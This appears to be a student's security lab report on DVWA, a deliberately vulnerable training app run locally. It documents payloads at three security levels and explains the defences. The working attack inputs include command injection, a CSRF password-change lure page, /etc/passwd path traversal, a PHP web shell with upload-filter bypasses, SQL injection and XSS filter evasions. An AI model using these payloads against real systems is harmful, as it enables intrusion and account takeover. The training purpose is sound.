## DVWA Security Report

## Command Injection

### Security Level: Low

**Payload Used:** `127.0.0.1; ls`

**Result:** Success - Both the ping command and the directory listing command executed, displaying the contents of the current directory after the ping results.

**Screenshot:**
![Command Injection - Low Security](screenshots/command_injection_low.png)

**Explanation of why it worked:**
The application passes user input directly to the system shell without any validation or sanitization. The semicolon (;) acts as a command separator, allowing multiple commands to be chained together. Since the input is not checked to ensure it contains only an IP address, the system executes both the intended ping command and the injected ls command.

**Explanation of why it failed at higher level:**
At Medium security, the application begins filtering certain characters like semicolons, but the filtering is incomplete and can be bypassed. At High security, proper input validation is implemented to only allow IP address formats.

### Security Level: Medium

**Payload Used:** `127.0.0.1 & ls`

**Result:** Success - The ampersand (&) operator allowed command injection, executing both the ping and ls commands.

**Screenshot:**
![Command Injection - Medium Security](screenshots/command-injection-medium.png)

**Explanation of why it worked:**
At Medium security, the application filters out semicolons (;) but fails to block other command separators like the ampersand (&). The application uses a blacklist approach that is incomplete, blocking only certain characters while leaving others vulnerable. The ampersand tells the shell to run the first command and then execute the second command in the background, allowing the injection to succeed.

**Explanation of why it failed at higher level:**
At High security, the application implements proper input validation using a whitelist approach. It strictly validates that the input contains only characters that belong to an IP address (numbers and dots) and rejects any input with special characters, shell metacharacters, or non-IP address patterns. This prevents any command injection regardless of which operator is used.

### Security Level: High

**Payload Used:** `127.0.0.1; ls`

**Result:** Failed - Only the ping command executed. The directory listing (ls) did not appear in the output.

**Screenshot:**
![Command Injection - High Security](screenshots/command-injection-high.png)

**Explanation of why it failed at higher level:**
At High security, the application implements proper input validation using a whitelist approach. It strictly validates that the input contains only characters that belong to a valid IP address format (numbers and dots). Any input containing special characters, letters, or shell metacharacters like semicolons (;) is rejected or sanitized before being passed to the system. This prevents command injection by ensuring only the intended IP address is processed by the ping command.


## Cross Site Request Forgery (CSRF)

### Security Level: Low

**Payload Used:**
```html
<html>
  <body>
    <h1>Win a Free Gift Card!</h1>
    <p>Click the button below to claim your $100 Amazon gift card:</p>
    
    <form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="attacker123" />
      <input type="hidden" name="password_conf" value="attacker123" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Claim Your Gift Card!" />
    </form>
  </body>
</html>
```

**Result:** Success - The password was changed from "newpassword123" to "attacker123" without requiring the current password or any additional verification. The attack worked by simply getting the authenticated user to click a button on a malicious page.

**Screenshot:**
![CSRF - Low Security](screenshots/csrf-low.png)

**Explanation of why it worked:**
The application accepts password changes via GET requests with all parameters in the URL. It does not implement any anti-CSRF tokens, does not require the current password for verification, and relies solely on session cookies for authentication. When an authenticated user visits a malicious page, their browser automatically includes their session cookies with the forged request. The server sees a valid session and processes the password change request, unable to distinguish between a legitimate request from the actual user and a forged request from an attacker's site.

**Explanation of why it failed at higher level:**
At higher security levels, the application implements anti-CSRF tokens that must accompany state-changing requests. These tokens are unique per session and validated by the server, making it impossible for an attacker to forge a valid request without knowing the current token. Additionally, the application may require current password verification or switch to using POST requests for sensitive operations, further protecting against CSRF attacks.


### Security Level: Medium
**Payload Used:**
```html
<html>
  <body>
    <form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="mediumtest123" />
      <input type="hidden" name="password_conf" value="mediumtest123" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Click me!" />
    </form>
  </body>
</html>
```

**Result:** Failed - The request was rejected with the message "That request didn't look correct."

**Screenshot:**
![CSRF - Medium Security](screenshots/csrf-medium.png)

**Explanation of why it worked:**
At Low security, the application accepts password changes via GET requests without any validation of where the request originated. It does not implement anti-CSRF tokens or require the current password, allowing any malicious site to forge requests as long as the user is authenticated. The server blindly trusts the request because the user's session cookie is automatically included by the browser.

**Explanation of why it failed at higher level:**
At Medium security, the application validates the HTTP Referer header to ensure the request originated from the same domain. When the malicious HTML file is opened locally, it sends no Referer header or one that doesn't match localhost, causing the server to reject the request as suspicious.


### Security Level: High

**Payload Used:**
```html
<html>
  <body>
    <form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="hightest123" />
      <input type="hidden" name="password_conf" value="hightest123" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Click me!" />
    </form>
  </body>
</html>
```

**Result:** Failed - The request was rejected with the message "CSRF token is incorrect."

**Screenshot:**
![CSRF - High Security](screenshots/csrf-high.png)

**Explanation of why it worked:**
At Low security, the application accepts password changes via GET requests without any validation of where the request originated. It does not implement anti-CSRF tokens or require the current password, allowing any malicious site to forge requests as long as the user is authenticated. The server blindly trusts the request because the user's session cookie is automatically included by the browser.

**Explanation of why it failed at higher level:**
At High security, the application implements anti-CSRF tokens that are unique to each user session. These tokens are generated by the server, embedded in forms, and must be submitted with any state-changing request. When a malicious site attempts to forge a request, it cannot know or include the correct token because it changes per session and cannot be predicted or obtained by an attacker from a different domain. The server validates the token before processing the password change, rejecting any request with a missing or incorrect token.


## File Inclusion

### Security Level: Low

**Payload Used:**`http://localhost:8080/vulnerabilities/fi/?page=../../../../../etc/passwd`

**Result:** Success - The contents of the /etc/passwd file were displayed, revealing system user accounts.

**Screenshot:**
![File Inclusion - Low Security](screenshots/file-inclusion-low.png)

**Explanation of why it worked:**
The application takes the 'page' parameter and directly includes it in a PHP include statement without any validation or sanitization. By using `../../../../../` directory traversal sequences, we can navigate up the directory structure to reach the root directory and then access sensitive system files like `/etc/passwd`. The server does not check if the requested file is within an allowed directory or if the path contains suspicious patterns.

**Explanation of why it failed at higher level:**
At higher security levels, the application implements input validation to block directory traversal sequences like `../` and restricts file inclusion to specific allowed files only. It may also use whitelisting to ensure only files from a predefined directory can be included.


### Security Level: Medium

**Payload Used:**`http://localhost:8080/vulnerabilities/fi/?page=..//..//..//..//etc/passwd`

**Result:** Success - The contents of the /etc/passwd file were displayed by bypassing the input filter using double slashes.

**Screenshot:**
![File Inclusion - Medium Security](screenshots/file-inclusion-medium.png)

**Explanation of why it worked:**
At Low security, no validation was performed, allowing direct directory traversal. The application blindly included any file path provided.

**Explanation of why it failed at higher level:**
At Medium security, the application implements basic filtering that removes or blocks `../` patterns. However, this filter is incomplete and can be bypassed using `..//` which still achieves directory traversal. The filter fails to recursively sanitize the input or account for variations in path traversal syntax. At High security, more robust validation would be implemented to block all such bypass attempts.


### Security Level: High

**Payload Used:**`http://localhost:8080/vulnerabilities/fi/?page=file:///etc/passwd`

**Result:** Success - The contents of the /etc/passwd file were displayed using the file:// wrapper, bypassing the High security restrictions.

**Screenshot:**
![File Inclusion - High Security](screenshots/file-inclusion-high.png)

**Explanation of why it worked:**
At Low security, no validation was performed, allowing direct directory traversal. At Medium security, basic filtering was implemented but could be bypassed using techniques like `..//`.

**Explanation of why it failed at higher level:**
While High security blocks directory traversal sequences like `../` and `..//`, it fails to block PHP wrappers like `file://`. The application does not properly validate or restrict the use of stream wrappers, allowing an attacker to read system files using the file wrapper despite other protections being in place. This demonstrates that security controls must be comprehensive and consider all possible input vectors.



## File Upload

### Security Level: Low

**Payload Used:**
```php
<?php
system($_GET['cmd']);
?>
```
Saved as shell.php

**Result:** Success - The file was uploaded and can be accessed to execute system commands.

**Screenshot:**
![File Upload - Low Security](screenshots/file-upload-low.png)

**Explanation of why it worked:**
At Low security, the application performs no validation on uploaded files. It does not check the file type, file content, or file extension. Any file, including malicious PHP scripts, can be uploaded and then accessed directly via the web server. Since PHP files are executed by the server, this allows an attacker to run arbitrary system commands by simply sending parameters to the uploaded shell.

**Explanation of why it failed at higher level:**
At higher security levels, the application implements file validation checks including file type verification, extension whitelisting, and content inspection. It may also rename uploaded files, store them outside the web root, or validate MIME types to prevent malicious file execution.


### Security Level: Medium

**Payload Used:**
```php
<?php
system($_GET['cmd']);
?>
```
Saved as shell.php.jpg

**Result:** Success - The file was uploaded successfully by using a double extension to bypass file type validation.

**Screenshot:**
![File Upload - Medium Security](screenshots/file-upload-medium.png)

**Explanation of why it worked:**
At Medium security, the application implements basic file validation such as checking file extensions. However, it only checks the first extension or uses a weak blacklist approach. By using a double extension like .php.jpg, the application may only check the last extension (.jpg) and incorrectly assume the file is a safe image, while the server still executes it as a PHP file due to the .php extension being recognized first. This bypass demonstrates that extension-based validation alone is insufficient without proper file content inspection and server configuration to prevent script execution in upload directories.

**Explanation of why it failed at higher level:**
At High security, the application implements content validation that examines the actual file contents, not just the filename. Since a simple PHP file without a valid image header would fail content inspection, the upload would be rejected.


### Security Level: High

**Payload Used:**
```php
GIF89a
<?php
system($_GET['cmd']);
?>
```
Saved as shell.php.jpg

**Result:** Success - The file was uploaded successfully by combining an image header with a double extension to bypass file validation.

**Screenshot:**
![File Upload - High Security](screenshots/file-upload-high.png)

**Explanation of why it worked:**
At High security, the application checks file content, not just extensions. However, adding a valid GIF header at the beginning tricks the content validation into identifying the file as a legitimate image. The file passes inspection while the PHP code remains executable when accessed.

**Explanation of why it failed at higher level:**
Even higher security would combine multiple defenses: strict whitelist validation, complete content analysis, storing files outside web root, disabling script execution in upload directories, and scanning files in a sandbox before acceptance. This defense-in-depth approach would block both extension and content bypass techniques.



## SQL Injection

### Security Level: Low

**Payload Used:** `1' OR '1'='1`

**Result:** Success - All user records were displayed instead of just one, demonstrating a basic authentication bypass.

**Screenshot:**
![SQL Injection - Low Security](screenshots/sqli-low.png)

**Explanation of why it worked:**
The application takes user input and directly inserts it into an SQL query without any sanitization. The original query likely looks like:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```
When 1' OR '1'='1 is injected, the query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'
```

Since '1'='1' is always true, the query returns all rows from the users table, bypassing the intended restriction to return only one specific user.

**Explanation of why it failed at higher level:**
At higher security levels, the application uses parameterized queries (prepared statements) which separate SQL logic from data. User input is treated as data only, not executable code, making injection impossible regardless of the payload. Additionally, input validation and escaping functions may be implemented to further protect against malicious input.


### Security Level: Medium

**Payload Used:** `1' OR '1'='1`

**Result:** The application replaced the user input field with a dropdown menu, preventing manual injection. Only predefined user IDs (1-5) can be selected, and each returns only its corresponding user record.

**Screenshot:**
![SQL Injection - Medium Security](screenshots/sqli-medium.png)

**Explanation of why it worked:**
At Medium security, the application implemented a dropdown menu that restricts user input to predefined values. This eliminates the attack surface by preventing arbitrary input from being submitted. In this implementation it effectively blocks the attack by removing the ability to inject malicious SQL syntax. 

**Explanation of why it failed at higher level:**
Since the application restricts input to predefined values through the dropdown menu, it prevents malicious SQL payloads from being submitted. As a result, the attacker cannot alter the structure of the SQL query, and the injection attempt fails.


### Security Level: High

**Payload Used:** `1' OR '1'='1`

**Result:** Failed - The payload was accepted as input but only returned the admin user record, not all users.

**Screenshot:**
![SQL Injection - High Security](screenshots/sqli-high.png)

**Explanation of why it worked:**
At High security, the application uses parameterized queries that treat user input as data only, not as executable code. The SQL query structure is fixed, and the payload is processed as a literal string value to compare against the user_id field, preventing any injection.

**Explanation of why it failed at higher level:**
At the High security level, DVWA applies stronger protections to user input. The application processes the input more carefully before using it in the SQL query, which prevents the injected condition from changing the query logic. Which is why the attack does not return all users and only a normal result is shown.



## SQL Injection (Blind)

### Security Level: Low

**Payload Used:** `1' AND '1'='1`

**Result:** Success - The application returned "User ID exists in the database," confirming that the injection works and the condition evaluated to true.

**Screenshot:**
![Blind SQL Injection - Low Security](screenshots/blind-sqli-low.png)

**Explanation of why it worked:**
The application takes user input and directly inserts it into an SQL query without any sanitization. The original query likely looks like:
```sql
SELECT user_id FROM users WHERE user_id = '$id'
```
When 1' AND '1'='1 is injected, the query becomes:
```sql
SELECT user_id FROM users WHERE user_id = '1' AND '1'='1'
```
Since '1'='1' is always true, the query executes successfully and returns a result if user ID 1 exists. The application then displays "User ID exists" based on whether any rows were returned, allowing an attacker to infer information through boolean conditions.

**Explanation of why it failed at higher level:**
At higher security levels, the application uses prepared statements and input validation to prevent SQL injection. User input is treated as data only, not executable code, so injected conditions like AND '1'='1' cannot alter the query logic. This blocks both regular and blind SQL injection attacks.


### Security Level: Medium

**Payload Used:**
`http://localhost:8080/vulnerabilities/sqli_blind/?id=1' AND '1'='1&Submit=Submit`

**Result:** Success - The application returned "User ID exists in the database," confirming that blind SQL injection works by bypassing the dropdown menu via direct URL requests.

**Screenshot:**
![Blind SQL Injection - Medium Security](screenshots/blind-sqli-medium.png)

**Explanation of why it worked:**
At Medium security, the UI restriction (dropdown menu) is client-side only and does not protect against direct URL manipulation. The server-side code remains vulnerable.

**Explanation of why it failed at higher level:**
At High security, proper server-side input validation and prepared statements would be implemented to prevent injection regardless of how the request is sent.


### Security Level: High

**Payload Used:** `1 AND SLEEP(5)`

**Result:** Success - The application returned "User ID exists in the database" after a significant delay (approximately 5 seconds), confirming that time-based blind SQL injection works.

**Screenshot:**
![Blind SQL Injection - High Security](screenshots/blind-sqli-high.png)

**Explanation of why it worked:**
At High security, the application may implement some protections but remains vulnerable to time-based blind SQL injection. The SLEEP(5) command is executed as part of the query, causing a delay before the response is returned. Since the application still displays a success message after the delay, it confirms that the injected SQL was executed.

**Explanation of why it failed at higher level:**
Secure implementations validate and sanitize user inputs before using them in database queries. Proper defenses such as parameterized queries, strict input validation, and prepared statements treat user input as data only, not executable code. This prevents malicious SQL commands like SLEEP() from being executed, eliminating time-based blind SQL injection attacks.



## Weak Session IDs

### Security Level: Low

**Payload Used:** Analyzed session ID generation pattern by clicking the "Generate" button multiple times.

**Result:** The session IDs are generated as simple sequential numbers (1, 2, 3, ...), making them highly predictable and vulnerable to session hijacking.

**Screenshot:**
![Weak Session IDs - Low Security](screenshots/weak-session-ids-low.png)

**Observations:**
- Click 1: `dvwaSession = 1`
- Click 2: `dvwaSession = 2`
- Click 3: `dvwaSession = 3`

**Explanation of why it worked:**
At Low security, the application generates session IDs using a simple incrementing counter with no randomness or complexity. An attacker can easily predict future session IDs and potentially hijack active user sessions by guessing valid IDs. This lack of entropy makes session fixation and session prediction attacks trivial.

**Explanation of why it failed at higher level:**
At higher security levels, session IDs are generated using strong cryptographic randomness rather than simple sequential numbers. This makes them unpredictable and resistant to session hijacking, brute-forcing, or session fixation attacks.


### Security Level: Medium

**Payload Used:** Not applicable - Analyzed session ID generation pattern by clicking the "Generate" button multiple times.

**Result:** The session IDs appear to be time-based values (likely Unix timestamps), which are still predictable if an attacker knows the approximate generation time.

**Screenshot:**
![Weak Session IDs - Medium Security](screenshots/weak-session-ids-medium.png)

**Observations:**
- Click 1: `dvwaSession = 1772799576`
- Click 2: `dvwaSession = 1772799609`
- Click 3: `dvwaSession = 1772799620`

**Explanation of why it worked:**
At Low security, session IDs were simple sequential numbers. At Medium security, the application improved by using time-based values instead of simple increments.

**Explanation of why it failed at higher level:**
At Medium security, the session IDs are generated using time-based values which are still predictable within a certain timeframe. An attacker who knows roughly when a session was created could brute-force a small range of possible values. At High security, truly random cryptographic session IDs would be implemented to prevent any form of prediction or brute-forcing.


### Security Level: High

**Payload Used:** Analyzed session ID generation pattern by clicking the "Generate" button multiple times.

**Result:** The session ID remained constant (1772799620) across all clicks, indicating that the application now properly ties the session ID to the user's browser session and does not regenerate it unnecessarily.

**Screenshot:**
![Weak Session IDs - High Security](screenshots/weak-session-ids-high.png)

**Observations:**
- Click 1: `dvwaSession = 1772799620`
- Click 2: `dvwaSession = 1772799620`
- Click 3: `dvwaSession = 1772799620`

**Explanation of why it worked:**
At Low security, session IDs were simple sequential numbers. At Medium security, they improved to time-based values but remained predictable.

**Explanation of why it failed at higher level:**
At High security, the application properly manages session identifiers by maintaining a single, consistent session ID throughout the user's browser session. The "Generate" button no longer creates new session IDs, preventing session fixation attacks where an attacker could force a user to use a known session ID. Additionally, the initial session ID is likely generated using strong randomness when the session is first created.



## DOM Based Cross Site Scripting (XSS)

### Security Level: Low

**Payload Used:**`http://localhost:8080/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>`

**Result:** Success - An alert box popped up displaying "XSS", confirming that JavaScript code was executed in the browser.

**Screenshot:**
![DOM XSS - Low Security](screenshots/dom-xss-low.png)

**Explanation of why it worked:**
The application takes the `default` parameter from the URL and injects it directly into the DOM using client-side JavaScript without any validation or sanitization. Since the content is inserted into the page and interpreted as HTML, the `<script>` tag is executed by the browser. This is a DOM-based XSS vulnerability because the attack payload modifies the DOM environment in the victim's browser, and the malicious script executes as a result of DOM manipulation rather than server-side reflection.

**Explanation of why it failed at higher level:**
At higher security levels, the application sanitizes user input before inserting it into the DOM. Dangerous characters and script tags are filtered or encoded, preventing injected JavaScript from executing in the browser.


### Security Level: Medium

**Payload Used:**`http://localhost:8080/vulnerabilities/xss_d/?default=<img src=x onerror=alert('XSS')>`

**Result:** Success - An alert box popped up displaying "XSS", confirming that JavaScript code was executed using an image tag bypass technique.

**Screenshot:**
![DOM XSS - Medium Security](screenshots/dom-xss-medium.png)

**Explanation of why it worked:**
At Low security, any payload including script tags worked. At Medium security, the application likely filters out `<script>` tags specifically, but fails to block other HTML tags that can execute JavaScript, such as `<img>` with `onerror` events. The image tag attempts to load an invalid image source (`x`), which triggers the `onerror` event and executes the JavaScript code.

**Explanation of why it failed at higher level:**
At higher security levels, the application implements more comprehensive input sanitization that encodes or removes all dangerous HTML tags and JavaScript events, not just script tags. This prevents any form of injected JavaScript from executing regardless of the vector used.


### Security Level: High

**Payload Used 1:**`http://localhost:8080/vulnerabilities/xss_d/?default=&lt;img src=x onerror=alert('XSS')>`

**Result:** Failed - The page displayed the payload as plain text without executing any JavaScript. The HTML entities were rendered literally rather than interpreted as code.

**Payload Used 2:**`http://localhost:8080/vulnerabilities/xss_d/?default=<body onload=alert('XSS')>`

**Result:** Failed - The page remained unchanged and no alert box appeared, indicating the payload was properly sanitized or encoded.

**Screenshot:**
![DOM XSS - High Security - Body Tag](screenshots/dom-xss-high.png)

**Explanation of why it worked:**
At Low security, any payload including script tags worked. At Medium security, script tags were blocked but image tags with onerror events bypassed the filters.

**Explanation of why it failed at higher level:**
At High security, the application implements proper output encoding and input sanitization. All dangerous characters and HTML tags are encoded or stripped before being inserted into the DOM. The HTML entities payload was rendered as literal text rather than interpreted as HTML, while the body tag payload was completely blocked. This prevents any form of injected JavaScript from executing, regardless of the vector used.



## Reflected Cross Site Scripting (XSS)

### Security Level: Low

**Payload Used:** `<script>alert('XSS')</script>`

**Result:** Success - An alert box popped up displaying "XSS", confirming that JavaScript code was executed in the browser.

**Screenshot:**
![Reflected XSS - Low Security](screenshots/reflected-xss-low.png)

**Explanation of why it worked:**
The application takes user input from the "name" parameter and directly reflects it back in the page response without any validation, sanitization, or output encoding. When the input contains a `<script>` tag, it is inserted into the HTML and executed by the browser. The server does not distinguish between safe text and executable code, treating all user input as trusted content.

**Explanation of why it failed at higher level:**
At higher security levels, the application sanitizes user input through output encoding before reflecting it back to the browser. This converts dangerous characters into harmless HTML entities, preventing the browser from interpreting injected scripts as executable code.


### Security Level: Medium

**Payload Used:**`http://localhost:8080/vulnerabilities/xss_r/?name=<ScRiPt>alert('XSS')</ScRiPt>`

**Result:** Success - An alert box popped up displaying "XSS", confirming that case manipulation bypassed the input filter.

**Screenshot:**
![Reflected XSS - Medium Security](screenshots/reflected-xss-medium.png)

**Explanation of why it worked:**
At Low security, any payload including script tags worked. At Medium security, the application likely implements a blacklist filter that removes or blocks lowercase `<script>` tags. However, the filter is case-sensitive and fails to block mixed-case variations like `<ScRiPt>`, allowing the JavaScript to execute.

**Explanation of why it failed at higher level:**
At higher security levels, the application implements more robust input validation that is case-insensitive or uses proper output encoding. This would block all variations of script tags regardless of case, as well as other XSS vectors.


### Security Level: High

**Payload Used 1:**`http://localhost:8080/vulnerabilities/xss_r/?name=%253Cscript%253Ealert(%27XSS%27)%253C/script%253E`

**Result:** Failed - The payload was displayed as plain text `%3Cscript%3Ealert('XSS')%3C/script%3E` without executing, showing that script tags are properly encoded.

**Output:**
Hello %3Cscript%3Ealert('XSS')%3C/script%3E

---

**Payload Used 2:**`http://localhost:8080/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert(%27XSS%27)%3E`

**Result:** Success - An alert box popped up displaying "XSS", confirming that image tag payloads still execute at High security.

**Screenshot:**
![Reflected XSS - High Security](screenshots/reflected-xss-high.png)

**Explanation of why it worked:**
At Low security, any payload including script tags worked. At Medium security, case manipulation bypassed the script tag filter.

**Explanation of why it failed at higher level:**
At High security, the application implements output encoding for script tags, converting them into harmless text. However, the protection is incomplete as it fails to block other XSS vectors like image tags with onerror events. The `<img src=x onerror=alert('XSS')>` payload still executes because the application does not sanitize or encode HTML event attributes. Complete protection would require comprehensive output encoding for all dangerous HTML tags and JavaScript events, not just script tags.



## Stored Cross Site Scripting (XSS)

### Security Level: Low

**Payload Used:**
- Name: `test`
- Message: `<script>alert('XSS')</script>`

**Result:** Success - An alert box popped up immediately after submission, and the script is now stored in the guestbook. Every time any user visits the page, the script will execute automatically.

**Screenshot:**
![Stored XSS - Low Security](screenshots/stored-xss-low.png)

------------------

**Screenshot 2:**
![Stored XSS - Low Security](screenshots/stored-xss-low2.png)

**Explanation of why it worked:**
The application takes user input from the Name and Message fields and stores it in the database without any validation, sanitization, or output encoding. When the guestbook page is loaded, the application retrieves all stored entries and displays them directly in the page HTML. Since the input contains a `<script>` tag, it is inserted into the DOM and executed by the browser. The server does not distinguish between safe text and executable code, and because the payload is stored in the database, it affects all users who visit the page, not just the original submitter.

**Explanation of why it failed at higher level:**
At higher security levels, the application validates and sanitizes user input before storing it in the database, and applies output encoding when displaying guestbook entries. This ensures that any injected scripts are rendered as harmless text rather than executable code, protecting all users who view the page.


### Security Level: Medium

**Payload Used:**
- Name: `test`
- Message: `<img src=x onerror=alert('XSS')>`

**Result:**
After submission, the message was stored in the guestbook. Upon page reload, a JavaScript alert box appeared automatically, confirming successful execution of the injected payload.

**Screenshot:**
![Stored XSS - Medium Security](screenshots/stored-xss-medium.png)

**Explanation of why it worked:**
At Low security, no filtering was applied to user input. At Medium security, the application blocks `<script>` tags but fails to sanitize other HTML elements. The `<img>` tag with an `onerror` event handler bypasses the filter and executes JavaScript when the image fails to load.

**Explanation of why it failed at higher level:**
At higher security levels, comprehensive input validation and output encoding are implemented. All dangerous HTML tags and event handlers are stripped or escaped before storage, preventing any injected JavaScript from executing.


### Security Level: High

**Payload Used 1:**
- Name: `test`
- Message: `javascript:alert('XSS')`

**Result:** Failed - The message was stored but with escaped characters: `javascript:alert(\'XSS\')`. The backslashes indicate output encoding was applied, preventing execution.

**Output:**
Name: test
Message: javascript:alert('XSS')

text

---

**Payload Used 2:**
- Name: `test`
- Message: `<svg onload=alert('XSS')>`

**Result:** Failed - The message field appeared empty after submission, indicating the payload was completely filtered or stripped by the application.

**Output:**
Name: test
Message:

text

**Screenshot:**
![Stored XSS - High Security](screenshots/stored-xss-high.png)

**Explanation of why it worked:**
At Low security, no filtering was applied. At Medium security, some tags were blocked but others bypassed the filters.

**Explanation of why it failed at higher level:**
At High security, the application implements comprehensive input validation and output encoding. The `javascript:` payload was escaped with backslashes, converting it to harmless text. The `<svg>` tag was completely stripped from the input. These defenses ensure that any injected JavaScript is either encoded or removed before being stored or displayed, preventing execution in the browser regardless of the payload type.



## Content Security Policy (CSP) Bypass

### Security Level: Low

**Payload Used:** `../../hackable/uploads/csp.js`

**Preparation:** First uploaded a malicious JavaScript file (`csp.js`) containing:
```javascript
alert('CSP Bypassed!');
```

**Result:** Success - The external script was loaded from the uploads directory and executed, bypassing any CSP restrictions.

**Screenshot:**
![CSP Bypass - Low Security](screenshots/csp-bypass-low.png)

**Explanation of why it worked:**
At Low security, the Content Security Policy is configured permissively, allowing scripts to be loaded from various sources including local file paths. Since the uploaded JavaScript file resides within the same domain, it falls under allowed sources. The application does not restrict which directories scripts can be loaded from, allowing an attacker to host malicious scripts in accessible locations like the uploads directory.

**Explanation of why it failed at higher level:**
At higher security levels, the CSP policy restricts script sources to trusted domains only and blocks loading scripts from arbitrary internal paths. Additionally, file upload validation prevents attackers from uploading executable scripts, and path traversal protections ensure uploaded files cannot be accessed as script sources.


### Security Level: Medium

**Payload Used:** `/../hackable/uploads/csp.js`

**Preparation:** First uploaded a malicious JavaScript file (`csp.js`) containing:
```javascript
alert('CSP Bypassed!');
```

**Result:** The script path was accepted and displayed on the page, but no JavaScript alert box appeared. The Content Security Policy at Medium security likely blocks execution of externally loaded scripts.

**Screenshot:**
![CSP Bypass - Medium Security](screenshots/csp-bypass-medium.png)

**Explanation of why it worked:**
At Low security, the CSP policy allowed loading and executing scripts from various sources including local file paths, making the uploaded JavaScript file executable.

**Explanation of why it failed at higher level:**
At Medium security, the Content Security Policy is configured to be more restrictive. While the script path may be displayed or included in the page, the CSP headers likely prevent external scripts from executing by restricting script sources to trusted domains only or by blocking inline script execution. Additionally, the browser enforces these CSP rules, blocking any JavaScript from untrusted sources regardless of whether the file path is accessible.


### Security Level: High

**Understanding the Vulnerability:**
The page makes a JSONP call to `../../vulnerabilities/csp/source/jsonp.php` which takes a callback parameter. The endpoint returns data in the format: `callback({"answer":"15"})`. This allows an attacker to control the function name that gets executed.

**Payload Used:** `http://localhost:8080/vulnerabilities/csp/source/jsonp.php?callback=alert(1)`

**Result:** The JSONP endpoint can be manipulated to execute arbitrary JavaScript by controlling the callback parameter.

**Screenshot:**
![CSP Bypass - High Security](screenshots/csp-bypass-high.png)

**Explanation of why it worked:**
At Low security, CSP was permissive allowing external scripts. At Medium security, external scripts were blocked but the path was accepted.

**Explanation of why it failed at higher level:**
At High security, the application uses a JSONP endpoint that dynamically executes the callback function name provided by the user. This creates a DOM-based XSS vulnerability where an attacker can control the function name to execute arbitrary JavaScript. The CSP policy may be bypassed because the script is loaded from the same origin and the callback parameter is not properly sanitized, allowing injection of malicious code.



## JavaScript Attacks

### Security Level: Low

**Payload Used:** Executed in browser console:
```javascript
document.getElementsByName("phrase")[0].value="success";
generate_token();
document.forms[0].submit();
```

**Result:** Success - The form was submitted with the word "success" and the message "Well done!" was displayed.

**Screenshot:**
![JavaScript Attacks - Low Security](screenshots/js-attacks-low.png)

**Explanation of why it worked:**
The application relies on client-side JavaScript for validation and token generation. By using the browser console, we can directly manipulate DOM elements and call JavaScript functions. The code:
- Changes the hidden or protected input field value to "success"
- Calls `generate_token()` to create a valid token (likely required for form submission)
- Submits the form programmatically

Since all validation happens on the client-side, an attacker can bypass it by executing custom JavaScript in the console.

**Explanation of why it failed at higher level:**
In a secure implementation, validation and token verification are handled server-side. Even if an attacker manipulates client-side JavaScript or DOM elements, the server independently validates the request and rejects any submissions that do not meet the required criteria, preventing client-side bypass attacks.


--------




